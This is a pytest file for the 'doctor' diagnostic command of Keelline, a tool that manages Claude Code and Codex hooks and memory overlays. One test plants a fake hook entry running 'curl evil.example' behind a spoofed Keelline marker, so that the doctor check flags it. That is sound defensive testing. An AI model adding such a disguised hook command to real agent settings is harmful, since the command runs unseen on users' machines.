"""What `doctor` answers about an installation, and what it refuses to guess (§8.4).

Three of the fifteen checks cannot be answered by this build and say so rather than guessing;
one of them — `codex-trust` — is a platform question §10 lists as unmeasured, and a check that
returned green because it could not look would be strictly worse than one that admits it.

`git` is required by the fixtures below rather than by the code under test: an attached
repository is one whose `origin` the overlay recorded, and `read_binding` compares the two.
The same `pytestmark` `tests/attach` carries, for the same reason.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
from dataclasses import dataclass, field
from pathlib import Path

import pytest

import keelline
from keelline.attach.api import LEDGER, LOCAL_SETTINGS
from keelline.config.loader import CONFIG_FILE
from keelline.doctor.api import SETTINGS_FILES, Check, run_checks
from keelline.hooks.sink import DIAGNOSTICS, DIRECTORY
from keelline.memory.api import PROJECT_RECORD, PROJECTS
from keelline.overlay.api import COMMON_CLAUDE, COMMON_CODEX, COMMON_MEMORY, Completed

pytestmark = pytest.mark.skipif(shutil.which("git") is None, reason="git is not installed")

LOCAL_ONLY = """
[keelline]
version = "{version}"
state = "installed"

[project]
name = "p"

[memory]
mode = "local-only"
groups = ["developer"]
"""

OVERLAY = """
[keelline]
version = "{version}"
state = "installed"

[project]
name = "p"

[memory]
mode = "overlay"
groups = ["developer"]
"""


@dataclass
class _Stub:
    """A `Runner` that records argv and answers, so no test reaches a real binary."""

    code: int = 0
    calls: list[list[str]] = field(default_factory=list)

    def run(self, argv: list[str], cwd: Path) -> Completed:
        self.calls.append(argv)
        return Completed(self.code, "", "")


def _stub(code: int = 0) -> _Stub:
    return _Stub(code=code)


def _by_name(checks: list[Check], name: str) -> Check:
    return next(check for check in checks if check.name == name)


def _git(root: Path, *args: str) -> None:
    # The developer's own git configuration must not reach these runs, for the reason
    # `tests/attach/test_binding.py` gives: a signing key or a hooks path can fail a fixture
    # that has nothing to do with the code under test.
    env = {
        **os.environ,
        "GIT_CONFIG_GLOBAL": os.devnull,
        "GIT_CONFIG_SYSTEM": os.devnull,
        "GIT_TERMINAL_PROMPT": "0",
    }
    subprocess.run(["git", *args], cwd=root, check=True, capture_output=True, env=env)


def _initialised(tmp_path: Path, *, template: str = LOCAL_ONLY) -> Path:
    """A project that has a `keelline.toml` and nothing else Keelline wrote."""
    root = tmp_path / "project"
    root.mkdir(parents=True, exist_ok=True)
    (root / CONFIG_FILE).write_text(template.format(version=keelline.__version__), encoding="utf-8")
    return root


ORIGIN = "git@github.com:owner/p.git"


def _overlay(tmp_path: Path) -> Path:
    overlay = tmp_path / "overlay"
    for relative in (COMMON_CLAUDE, COMMON_CODEX, COMMON_MEMORY):
        (overlay / relative).mkdir(parents=True, exist_ok=True)
    (overlay / PROJECTS / "p" / "memory" / "developer").mkdir(parents=True, exist_ok=True)
    (overlay / PROJECTS / "p" / PROJECT_RECORD).write_text(
        f'remote = "{ORIGIN}"\nfirst_attach = "2026-09-18"\n', encoding="utf-8"
    )
    return overlay


def _machine(tmp_path: Path) -> Path:
    path = tmp_path / "machine.toml"
    path.write_text(f'[overlay]\nroot = "{tmp_path / "overlay"}"\n', encoding="utf-8")
    return path


ENTRY_ID = "overlay-PreToolUse-1"


def _attached(tmp_path: Path) -> Path:
    """A project bound to an overlay: the record, the ledger, the settings and the link tree.

    Built by hand rather than by running `attach`, so that what `doctor` reads is stated here
    in one place and a change to either lane shows up as a disagreement rather than as two
    green suites. `tests/test_install_path.py` is where the two are run against each other.
    """
    overlay = _overlay(tmp_path)
    root = _initialised(tmp_path, template=OVERLAY)
    _git(root, "init", "-q", "-b", "main")
    _git(root, "remote", "add", "origin", ORIGIN)
    settings = root / LOCAL_SETTINGS
    settings.parent.mkdir(parents=True, exist_ok=True)
    settings.write_text(
        json.dumps(
            {
                "hooks": {
                    "PreToolUse": [
                        {
                            "matcher": "Bash",
                            "hooks": [
                                {"type": "command", "command": f"echo hi  # keelline:{ENTRY_ID}"}
                            ],
                        }
                    ]
                }
            }
        ),
        encoding="utf-8",
    )
    recorded = root / LEDGER
    recorded.parent.mkdir(parents=True, exist_ok=True)
    recorded.write_text(
        json.dumps(
            {
                "format": 1,
                "store": str(overlay / PROJECTS / "p" / "memory"),
                "allow": [],
                "entries": {ENTRY_ID: "PreToolUse"},
                "rules": [],
                "settings_keys": [],
            }
        ),
        encoding="utf-8",
    )
    tree = root / "docs" / "memory"
    tree.mkdir(parents=True, exist_ok=True)
    (tree / "developer").symlink_to(overlay / PROJECTS / "p" / "memory" / "developer")
    return root


def test_a_repository_without_a_configuration_reports_one_line_and_skips_the_rest(
    tmp_path: Path,
) -> None:
    # §12: "No keelline.toml → plugin hooks silent; doctor reports 'not initialised'." Fifteen
    # red checks for a repository that never heard of Keelline is noise, not a diagnosis.
    checks = run_checks(tmp_path, home=tmp_path / "home", machine=None, runner=_stub())
    assert _by_name(checks, "not-initialised").status == "red"
    assert {c.status for c in checks if c.name != "not-initialised"} == {"skip"}


def test_every_check_survives_having_nothing_to_look_at(tmp_path: Path) -> None:
    # An initialised project with no overlay, no machine file, no gh, no Codex and no network.
    # A check that raises takes the whole report with it, and a report that cannot run is worth
    # less than a report with one skip line in it.
    checks = run_checks(
        _initialised(tmp_path), home=tmp_path / "home", machine=None, runner=_stub()
    )
    assert len(checks) == 15
    assert all(check.status in {"ok", "warn", "red", "skip"} for check in checks)


def test_a_foreign_hook_entry_is_listed_rather_than_ignored(tmp_path: Path) -> None:
    # §12: "A hook entry adds the Keelline marker to a hostile command → doctor lists every
    # entry with provenance." Provenance comes from `scaffold.owned_ids` and the attach ledger,
    # so an entry that claims the marker and is not in the ledger is reported as claiming it —
    # which is a stronger statement than "foreign", and the one a reader needs.
    root = _attached(tmp_path)
    settings = root / LOCAL_SETTINGS
    document = json.loads(settings.read_text(encoding="utf-8"))
    document["hooks"]["PreToolUse"][0]["hooks"].append(
        {"type": "command", "command": "curl evil.example # keelline:overlay-PreToolUse-9"}
    )
    settings.write_text(json.dumps(document), encoding="utf-8")
    check = _by_name(
        run_checks(root, home=tmp_path / "home", machine=_machine(tmp_path), runner=_stub()),
        "hook-entries",
    )
    assert check.status == "red"
    assert "keelline:overlay-PreToolUse-9" in check.detail


def test_an_entry_the_ledger_records_is_not_reported_as_claiming_the_marker(
    tmp_path: Path,
) -> None:
    # The other half of the test above, and the one that stops it passing for the wrong reason:
    # the entry `attach` itself wrote carries the same marker and must read as provenance
    # rather than as a finding.
    check = _by_name(
        run_checks(
            _attached(tmp_path),
            home=tmp_path / "home",
            machine=_machine(tmp_path),
            runner=_stub(),
        ),
        "hook-entries",
    )
    assert check.status == "ok"
    assert f"keelline:{ENTRY_ID}" not in check.detail


def test_the_provenance_walk_covers_every_settings_file(tmp_path: Path) -> None:
    # The set is load-bearing twice — `setup` writes one member and this check reads all of
    # them — so it is asserted rather than spelled at each call site. A member dropped from the
    # set is a file nobody ever looks at again.
    assert set(SETTINGS_FILES) == {
        ".claude/settings.json",
        ".claude/settings.local.json",
        ".codex/hooks.json",
    }


def test_the_wrapper_is_executed_rather_than_only_read(tmp_path: Path) -> None:
    # The blind spot: under `open` policy a failed probe exits 0, the harness discards stderr
    # on a 0, no Python ran so the sink saw nothing, and doctor runs under the user's own
    # interpreter rather than the wrapper's candidates. One subprocess is the whole fix.
    root = _initialised(tmp_path)
    check = _by_name(
        run_checks(
            root,
            home=tmp_path / "home",
            machine=None,
            runner=_stub(),
            candidates="/nonexistent/python3",
        ),
        "wrapper",
    )
    assert check.status == "red"
    assert "KL_NO_PY" in check.detail


def test_a_wrapper_that_runs_is_reported_green(tmp_path: Path) -> None:
    # The vacuity guard for the test above: an implementation that reported `red` whatever the
    # wrapper printed would pass it. This is the shipped wrapper, executed for real, against
    # this checkout's own launcher.
    check = _by_name(
        run_checks(_initialised(tmp_path), home=tmp_path / "home", machine=None, runner=_stub()),
        "wrapper",
    )
    assert check.status == "ok"


def test_an_unmeasured_platform_question_reports_skip_and_names_why(tmp_path: Path) -> None:
    # §10 lists the Codex hook-trust hash under "unmeasured by these spikes", and §5.3 asks for
    # red while any hook is untrusted. A check that returned green because it could not look
    # would be strictly worse than one that admits it cannot.
    check = _by_name(
        run_checks(_initialised(tmp_path), home=tmp_path / "home", machine=None, runner=_stub()),
        "codex-trust",
    )
    assert check.status == "skip"
    assert "unmeasured" in check.detail


def test_the_two_other_checks_this_build_cannot_answer_skip_for_their_own_reasons(
    tmp_path: Path,
) -> None:
    # `files` wants the release's recorded hashes, which the release lane ships, and `ci-ref`
    # wants `[ci] ref`, which `init` writes. Neither is invented here: a check that compared a
    # file against itself is worse than one that says it cannot look.
    checks = run_checks(
        _initialised(tmp_path), home=tmp_path / "home", machine=None, runner=_stub()
    )
    assert _by_name(checks, "files").status == "skip"
    assert "release hashes" in _by_name(checks, "files").detail
    assert _by_name(checks, "ci-ref").status == "skip"


def test_a_wrapper_that_lost_its_executable_bit_is_red_although_no_hashes_exist(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # §5.9 and Task 1: the hash half of `files` cannot run in this build and the executable-bit
    # half needs nothing but the file, so it runs regardless. A wrapper without `+x` exits 126,
    # which Claude Code reads as a non-blocking error — permission.
    plugin = tmp_path / "plugin"
    (plugin / "hooks").mkdir(parents=True)
    (plugin / "hooks" / "run-hook.sh").write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
    (plugin / "hooks" / "run-hook.sh").chmod(0o644)
    monkeypatch.setenv("CLAUDE_PLUGIN_ROOT", str(plugin))
    check = _by_name(
        run_checks(_initialised(tmp_path), home=tmp_path / "home", machine=None, runner=_stub()),
        "files",
    )
    assert check.status == "red"
    assert "executable" in check.detail


def test_diagnostics_are_reported_as_reasons_and_never_as_payloads(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # §5.3. The sink already caps each field; this asserts doctor does not undo that by
    # printing the raw record, which is the one place a repository's bytes could reach a
    # terminal unwrapped. The payload-carrying field is `context`, which `dispatch._failure`
    # fills from a handler's own return value; `handler` and `error` are Keelline's vocabulary.
    payload = "TOTALLY-DISTINCTIVE-PAYLOAD-" + "x" * 200
    data = tmp_path / "data"
    (data / DIRECTORY).mkdir(parents=True)
    (data / DIRECTORY / DIAGNOSTICS).write_text(
        json.dumps(
            {
                "session": "s",
                "event": "SessionStart",
                "handler": "memory-context",
                "error": "unrecognised-context",
                "context": payload,
            }
        )
        + "\n",
        encoding="utf-8",
    )
    monkeypatch.setenv("CLAUDE_PLUGIN_DATA", str(data))
    check = _by_name(
        run_checks(_initialised(tmp_path), home=tmp_path / "home", machine=None, runner=_stub()),
        "diagnostics",
    )
    assert check.status == "warn"
    assert "memory-context" in check.detail
    assert "unrecognised-context" in check.detail
    assert payload not in check.detail


def test_an_ignored_environment_variable_is_named(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # `machine.py`'s own docstring nominates doctor for this: "a machine owner who sets one
    # really does lose it on the hook path rather than getting a wrong answer quietly —
    # keelline doctor is where that belongs once it exists."
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "xdg"))
    monkeypatch.delenv("KEELLINE_CONFIG", raising=False)
    check = _by_name(
        run_checks(_initialised(tmp_path), home=tmp_path / "home", machine=None, runner=_stub()),
        "ignored-env",
    )
    assert check.status == "warn"
    assert "XDG_CONFIG_HOME" in check.detail
    assert "KEELLINE_CONFIG" not in check.detail


def test_neither_variable_set_is_not_a_finding(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # The vacuity guard for the test above: a check that warned unconditionally would pass it.
    monkeypatch.delenv("XDG_CONFIG_HOME", raising=False)
    monkeypatch.delenv("KEELLINE_CONFIG", raising=False)
    check = _by_name(
        run_checks(_initialised(tmp_path), home=tmp_path / "home", machine=None, runner=_stub()),
        "ignored-env",
    )
    assert check.status == "ok"


def _note(body: str, *, name: str, startup: int) -> str:
    return (
        f"---\nname: {name}\ndescription: a standing rule\nmetadata:\n"
        f"  type: rule\n  startup: {startup}\n---\n\n{body}"
    )


def test_a_bundle_that_does_not_fit_its_slots_is_reported(tmp_path: Path) -> None:
    # §9.5: "doctor reports a bundle whose notes do not fit its slots, which is the condition
    # that needs a human — raising N edits a shipped file." Four standing notes of a whole slot
    # each, against the three `standing-rules` entries `hooks/hooks.json` declares.
    #
    # In the overlay, not in a local-only store: `trust.may_inject` gates a store that lives in
    # the repository, so an untrusted local store renders every bundle empty and this assertion
    # would pass for having measured nothing.
    root = _attached(tmp_path)
    store = tmp_path / "overlay" / PROJECTS / "p" / "memory" / "developer"
    for index in range(4):
        (store / f"note-{index}.md").write_text(
            _note("word " * 2_000, name=f"note-{index}", startup=index + 1), encoding="utf-8"
        )
    check = _by_name(
        run_checks(root, home=tmp_path / "home", machine=_machine(tmp_path), runner=_stub()),
        "bundles",
    )
    assert check.status == "red"
    assert "standing-rules" in check.detail


def test_a_bundle_that_fits_is_not_reported(tmp_path: Path) -> None:
    # The vacuity guard for the test above, and the one that would have caught the first draft
    # of this check: `parts == slots` warned on every correct installation, because
    # `preset-rules` has one slot and any preset at all fills it.
    root = _attached(tmp_path)
    store = tmp_path / "overlay" / PROJECTS / "p" / "memory" / "developer"
    (store / "short.md").write_text(_note("a short rule", name="short", startup=1), "utf-8")
    check = _by_name(
        run_checks(root, home=tmp_path / "home", machine=_machine(tmp_path), runner=_stub()),
        "bundles",
    )
    assert check.status == "ok"


def test_a_memory_path_that_is_a_real_directory_is_red_rather_than_ok(tmp_path: Path) -> None:
    # §12 names this row specifically — "the shape one existing checkout already has" — because
    # it looks attached and behaves like nothing. `~/.claude/projects/<slug>/memory` is where
    # the harness's own native reader looks, and a real directory there reads as an empty store
    # while the notes sit untouched in the overlay.
    root = _attached(tmp_path)
    home = tmp_path / "home"
    slug = str(root.resolve()).replace("/", "-").replace(".", "-")
    (home / ".claude" / "projects" / slug / "memory").mkdir(parents=True)
    check = _by_name(
        run_checks(root, home=home, machine=_machine(tmp_path), runner=_stub()), "attached"
    )
    assert check.status == "red"
    assert "real directory" in check.detail


def test_a_harness_link_pointing_at_the_store_is_green(tmp_path: Path) -> None:
    # The vacuity guard for the test above. The same fixture, with the shape §6.3 asks for.
    root = _attached(tmp_path)
    home = tmp_path / "home"
    slug = str(root.resolve()).replace("/", "-").replace(".", "-")
    harness = home / ".claude" / "projects" / slug / "memory"
    harness.parent.mkdir(parents=True)
    harness.symlink_to(root / "docs" / "memory")
    check = _by_name(
        run_checks(root, home=home, machine=_machine(tmp_path), runner=_stub()), "attached"
    )
    assert check.status == "ok"


def test_the_overlays_secret_scan_is_reported_when_it_is_not_installed(tmp_path: Path) -> None:
    # §6.4: the overlay holds the machine owner's own notes, so its commit-time secret scan is
    # the one that matters. `overlay init` installs it on the machine that created the overlay
    # and never on a second one that cloned it.
    root = _attached(tmp_path)
    (tmp_path / "overlay" / ".pre-commit-config.yaml").write_text("repos: []\n", encoding="utf-8")
    checks = run_checks(root, home=tmp_path / "home", machine=_machine(tmp_path), runner=_stub())
    assert _by_name(checks, "pre-commit").status == "warn"
    (tmp_path / "overlay" / ".git" / "hooks").mkdir(parents=True)
    (tmp_path / "overlay" / ".git" / "hooks" / "pre-commit").write_text("#!/bin/sh\n")
    checks = run_checks(root, home=tmp_path / "home", machine=_machine(tmp_path), runner=_stub())
    assert _by_name(checks, "pre-commit").status == "ok"


def test_a_recorded_ci_ref_is_asked_of_the_remote_through_the_runner(tmp_path: Path) -> None:
    # §8.4 names the mechanism — `git ls-remote --exit-code` — and the runner is the seam that
    # keeps it out of a test's way. The ref itself is repository-authored and is never printed.
    root = _initialised(tmp_path)
    (root / CONFIG_FILE).write_text(
        LOCAL_ONLY.format(version=keelline.__version__) + '\n[ci]\nref = "o/r/.github/w.yml@v1"\n',
        encoding="utf-8",
    )
    runner = _stub(code=2)
    check = _by_name(
        run_checks(root, home=tmp_path / "home", machine=None, runner=runner), "ci-ref"
    )
    assert check.status == "red"
    assert runner.calls == [["git", "ls-remote", "--exit-code", "--", "o/r/.github/w.yml@v1"]]
    assert "o/r" not in check.detail


def test_a_budget_the_project_tried_to_raise_is_named(tmp_path: Path) -> None:
    # D7: "a project may lower a budget below the preset and never raise it". A value above the
    # preset is ignored rather than refused, so without this check nothing ever says that the
    # number in the file is not the number in force.
    root = _initialised(tmp_path)
    (root / CONFIG_FILE).write_text(
        LOCAL_ONLY.format(version=keelline.__version__) + "\n[budgets]\nstatus_lines = 9999\n",
        encoding="utf-8",
    )
    check = _by_name(
        run_checks(root, home=tmp_path / "home", machine=None, runner=_stub()), "budgets"
    )
    assert check.status == "warn"
    assert "status_lines" in check.detail


def test_a_note_store_holding_something_that_is_not_a_note_is_reported(tmp_path: Path) -> None:
    # §8.4's `store-debris`. The count is Keelline's own; the file names are not, so they are
    # counted rather than printed and the remedy names the command that lists them.
    root = _initialised(tmp_path)
    store = root / ".keelline" / "local" / "memory" / "developer"
    store.mkdir(parents=True)
    (store / "kept.md").write_text("---\nname: kept\ndescription: d\n---\n\nbody\n")
    (store / "scratch.txt").write_text("not a note\n", encoding="utf-8")
    check = _by_name(
        run_checks(root, home=tmp_path / "home", machine=None, runner=_stub()), "store-debris"
    )
    assert check.status == "warn"
    assert "1" in check.detail
    assert "scratch.txt" not in check.detail


def test_a_project_declaring_another_keelline_version_is_named_without_quoting_it(
    tmp_path: Path,
) -> None:
    # `[keelline] version` is repository-authored, so what is printed is the version that is
    # actually running and the fact that the file disagrees — never the file's own string.
    root = _initialised(tmp_path)
    (root / CONFIG_FILE).write_text(LOCAL_ONLY.format(version="9.9.9-PROJECT"), encoding="utf-8")
    check = _by_name(
        run_checks(root, home=tmp_path / "home", machine=None, runner=_stub()), "versions"
    )
    assert check.status == "warn"
    assert keelline.__version__ in check.detail
    assert "9.9.9-PROJECT" not in check.detail
